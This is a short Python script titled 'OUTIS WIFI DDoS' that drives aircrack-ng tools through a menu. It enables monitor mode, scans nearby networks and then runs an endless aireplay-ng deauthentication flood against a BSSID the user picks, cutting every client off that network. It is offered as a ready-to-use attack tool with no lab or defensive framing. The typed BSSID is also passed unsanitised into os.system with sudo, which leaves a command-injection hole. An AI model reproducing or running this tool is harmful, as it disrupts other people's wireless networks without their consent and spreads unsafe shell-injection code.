import os 
import time 

# Print a message indicating the start of the program
print("pls wait.....")

# Print a welcome message
print("""
  ****************************************
  *            OUTIS WIFI DDoS           *
  *                                      *
  *  https://github.com/josephgeorge26   *
  ****************************************
""")

# Define a function to get the Wi-Fi interface name
def get_wifi_interface():
    # Initialize a list to store Wi-Fi interfaces
    wifi_interfaces = []
    
    # Command to get Wi-Fi interface using iw dev
    cmd = """iw dev | awk '$1=="Interface"{print $2}'"""
    
    # Write command to a shell script file
    file = open(".wiface.sh", "w")
    file.write(cmd + " > .wiface.txt")
    file.close()
    
    # Make shell script executable
    os.system("sudo chmod +x .wiface.sh")
    
    # Execute shell script to get Wi-Fi interface
    os.system("sudo ./.wiface.sh")
    
    # Read Wi-Fi interface from file
    file2 = open(".wiface.txt", "r")
    os.system("sudo chmod +x .wiface.txt")
    wifi_interfaces.append(file2.read().strip())
    file2.close()
    
    # Remove temporary files
    os.system("sudo rm .wiface.sh ")
    os.system("sudo rm .wiface.txt ")
    
    # Return the Wi-Fi interface
    return wifi_interfaces[0]

# Main loop of the program
while True:
    print("""\n \n
1. monitor mode
2. exit monitor mode 
3. select wifi 
4. exit

""")
    try:
        # Get user input
        i = input("\n O.W.D > ")
        
        # Check user input and perform actions accordingly
        if i == '1':
            # Start monitor mode using airmon-ng
            os.system("airmon-ng start " + str(get_wifi_interface()))
        elif i == '2':
            # Stop monitor mode using airmon-ng
            os.system("airmon-ng stop " + str(get_wifi_interface()))
        elif i == '3':
            # Scan for Wi-Fi networks using airodump-ng
            os.system("airodump-ng " + str(get_wifi_interface()))
            # Prompt user to select BSSID and deauthenticate clients using aireplay-ng
            wifi_bssid = input("\n select BSSID: ")
            os.system("aireplay-ng -D --deauth 0  --ignore-negative-one  -a "+ wifi_bssid  + " " +  get_wifi_interface())
        elif i == '4':
            # Exit the program
            break
    except KeyboardInterrupt:
        # Handle KeyboardInterrupt (Ctrl+C)
        i2 = input("\n \n \nexit? [y/n]? ")
        if i2 == "y":
            # Stop monitor mode and exit
            os.system("airmon-ng stop " + str(get_wifi_interface()))
            break
        elif i2 =="n":
            # Continue program execution
            pass
